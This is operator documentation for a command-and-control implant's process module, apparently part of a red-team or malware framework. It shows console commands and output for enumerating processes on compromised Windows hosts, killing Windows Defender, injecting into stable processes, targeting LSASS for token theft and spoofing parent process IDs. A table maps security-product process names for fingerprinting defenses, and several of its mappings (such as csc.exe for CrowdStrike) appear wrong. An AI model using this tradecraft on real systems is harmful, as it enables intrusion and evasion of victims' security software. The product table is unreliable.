# Process Management

List, terminate, and start processes on agent machines.

---

## List Processes

```
❯ process list a1b2
[*] Requesting process list from agent a1b2c3d4...
[+] Process list command queued. ID: d4e5f6a7-...
[*] Waiting for result...

PID      NAME                      PATH                                     DESCRIPTION                   
------------------------------------------------------------------------------------------------------------
4        System                                                              NT Kernel & System            
488      smss.exe                  \SystemRoot\System32\smss.exe             Windows Session Manager       
604      csrss.exe                 C:\Windows\system32\csrss.exe             Client Server Runtime Process 
692      wininit.exe               C:\Windows\system32\wininit.exe           Windows start-up application  
752      services.exe              C:\Windows\system32\services.exe          Services and Controller app   
760      lsass.exe                 C:\Windows\system32\lsass.exe             Local Security Authority      
1124     svchost.exe               C:\Windows\System32\svchost.exe           Host Process for Services     
...
3892     MsMpEng.exe               C:\ProgramData\Microsoft\Windows Defender\... Antimalware Service       
4208     taburtuai_agent.exe       C:\Windows\Temp\svchost.exe               (agent process)               
```

**Why use it:**
- Identify security products running (MsMpEng = Windows Defender, avgnt = Avast, MBAMService = Malwarebytes)
- Find processes to inject into (stable long-running processes: svchost, explorer, notepad, RuntimeBroker)
- Identify LSASS PID for token operations
- Find target user sessions (look for explorer.exe owned by specific user)
- Confirm your injection landed (new process appeared)

**OPSEC note:** Process enumeration via Toolhelp32 (`CreateToolhelp32Snapshot`) is one of the most logged API call patterns. Some EDRs will alert on enumeration. The agent does this in a single call — this is expected behavior from many legitimate programs.

---

## Kill Process

By PID (recommended — precise):
```
❯ process kill a1b2 --pid 3892
[*] Requesting to kill process 3892 on agent a1b2c3d4...
[+] Process kill command queued. ID: e5f6a7b8-...
  ◓ executing
[+] Process kill completed: Process 3892 terminated
[+] Process 3892 killed successfully
```

By name (kills all matching processes):
```
❯ process kill a1b2 --name MsMpEng.exe
```

**When to use:**
- Terminating AV/EDR processes before running tools (rarely effective without elevated privileges, and extremely loud — prefer bypasses)
- Ending a stuck or runaway command
- Cleaning up artifacts (terminate your own dropped processes before removing them)

**OPSEC warning:** Killing `MsMpEng.exe` or other security product processes requires SYSTEM/TrustedInstaller-level privileges and generates high-confidence alerts in any modern SIEM. This approach is almost never recommended for production engagements. Use AMSI/ETW bypass and injection instead.

---

## Start Process

```
❯ process start a1b2 cmd.exe --args "/c whoami > C:\Temp\out.txt"
[*] Requesting to start process 'cmd.exe' with args '/c whoami > C:\Temp\out.txt' on agent a1b2c3d4...
[+] Process start command queued. ID: f6a7b8c9-...
  ◑ executing
[+] Process 'cmd.exe' started successfully
```

**Use cases:**
- Launch a process in a specific working directory
- Spawn a child process under a different user context (combine with token steal)
- Start a legitimate-looking binary to blend into the process tree

**Combining with PPID spoofing:** Instead of using `process start`, use `inject ppid` to spawn the process with a spoofed parent:

```
❯ inject ppid a1b2 cmd.exe --ppid-name explorer.exe --args "/c whoami"
```

This makes the new `cmd.exe` appear as a child of `explorer.exe` in the process tree, rather than a child of the agent.

---

## Identifying Security Software

Look for these process names in the list output to gauge defenses:

| Process | Product |
|---------|---------|
| `MsMpEng.exe` | Windows Defender (MDAV) |
| `MsSense.exe` | Microsoft Defender for Endpoint (MDE) |
| `SenseCncProxy.exe` | MDE C&C proxy |
| `avgnt.exe`, `avshadow.exe` | Avast / AVG |
| `MBAMService.exe`, `mbam.exe` | Malwarebytes |
| `ekrn.exe`, `eguiProxy.exe` | ESET NOD32 |
| `csc.exe` | CrowdStrike Falcon sensor |
| `CylanceSvc.exe` | Cylance |
| `cb.exe`, `RepMgr.exe` | Carbon Black |
| `SentinelAgent.exe` | SentinelOne |
| `cyserver.exe` | Cybereason |
| `hmpalert.exe` | HitmanPro.Alert |
| `bdagent.exe`, `vsserv.exe` | Bitdefender |
| `SEDService.exe` | Symantec EDR |
